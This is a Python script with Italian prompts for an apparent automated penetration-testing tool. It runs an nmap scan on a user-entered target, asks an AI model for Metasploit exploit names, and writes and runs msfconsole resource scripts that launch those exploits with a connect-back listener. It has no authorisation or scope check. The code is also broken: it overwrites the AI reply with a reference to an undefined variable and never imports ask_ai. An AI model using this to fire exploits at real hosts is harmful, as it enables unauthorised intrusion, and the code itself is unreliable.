import os
import subprocess
import datetime
import requests
from rich import print
from rich.console import Console
from utils.config_ai import AI_MODEL_DEFAULT, AI_MODEL_CODE



SCANS_DIR = "scans"
LPORT = "8080"

console = Console()


def get_local_ip():
    import socket
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "127.0.0.1"

LHOST = get_local_ip()


def run_pentest_auto():
    while True:
        target = console.input("\nüíª Inserisci il target o premi Invio per tornare: ").strip()
        if not target:
            return False
        print(f"\nHai inserito il target: {target}")
        conferma = input("‚úÖ Premi [Invio] per continuare | r = reinserire | q = menu principale: ").strip().lower()

        if conferma == "":
            break
        elif conferma == "q":
            return False

    timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    base_dir = os.path.join(SCANS_DIR, timestamp)
    os.makedirs(base_dir, exist_ok=True)

    nmap_output_file = os.path.join(base_dir, "nmap_scan.txt")
    print("\n[cyan]üîç Scansione Nmap in corso...[/cyan]")
    subprocess.run(["nmap", "-sV", "-T4", "-oN", nmap_output_file, target])

    with open(nmap_output_file) as f:
        nmap_data = f.read()

    # Analisi IA
    prompt = (
        f"Ecco l'output Nmap:\n\n{nmap_data}\n\n"
        "Suggerisci exploit Metasploit da usare. Fornisci solo i nomi, uno per riga. In italiano."
    )
    response_text = ask_ai(prompt, model=AI_MODEL_DEFAULT)


    try:
        response_text = response.json().get("response", "")
    except Exception:
        response_text = "‚ùå Errore nella risposta IA"

    print("\n[bold green]üß† Suggerimenti AI:[/bold green]")
    print(response_text)

    suggestions_file = os.path.join(base_dir, "ollama_response.txt")
    with open(suggestions_file, "w") as f:
        f.write(response_text)

    # Generazione RC
    script_dir = os.path.join(base_dir, "scripts")
    os.makedirs(script_dir, exist_ok=True)

    with open("exploit_list.txt") as f:
        valid_exploits = set(line.strip().split()[0] for line in f if "exploit/" in line)

    modules = [line.strip() for line in response_text.splitlines()
               if line.strip().startswith("exploit/") and line.strip() in valid_exploits]

    for idx, module in enumerate(modules, 1):
        rc_file = os.path.join(script_dir, f"exploit_{idx}.rc")
        with open(rc_file, "w") as f:
            f.write(f"use {module}\n")
            f.write(f"set RHOST {target}\n")
            f.write(f"set LHOST {LHOST}\n")
            f.write(f"set LPORT {LPORT}\n")
            f.write("exploit -j\n")
        print(f"[yellow]üìÑ Creato:[/yellow] {rc_file}")

    # Esecuzione exploit
    print("\n[bold cyan]‚ñ∂ Avvio degli exploit...[/bold cyan]")
    for rc in os.listdir(script_dir):
        rc_path = os.path.join(script_dir, rc)
        subprocess.run(["msfconsole", "-q", "-r", rc_path])

    # Step 5: Searchsploit
    try:
        from utils.searchsploit_helper import run_searchsploit
        run_searchsploit()
    except Exception as e:
        print(f"[red]‚ùå Errore searchsploit automatico:[/red] {e}")

    # Step 6: Generazione report PDF
    try:
        from utils.reporting import generate_session_report
        generate_session_report()
    except Exception as e:
        print(f"[red]‚ùå Errore generazione report PDF automatico:[/red] {e}")

    print(f"\n[green]‚úî Pentest automatico completato. Output salvato in:[/green] {base_dir}")
    return True
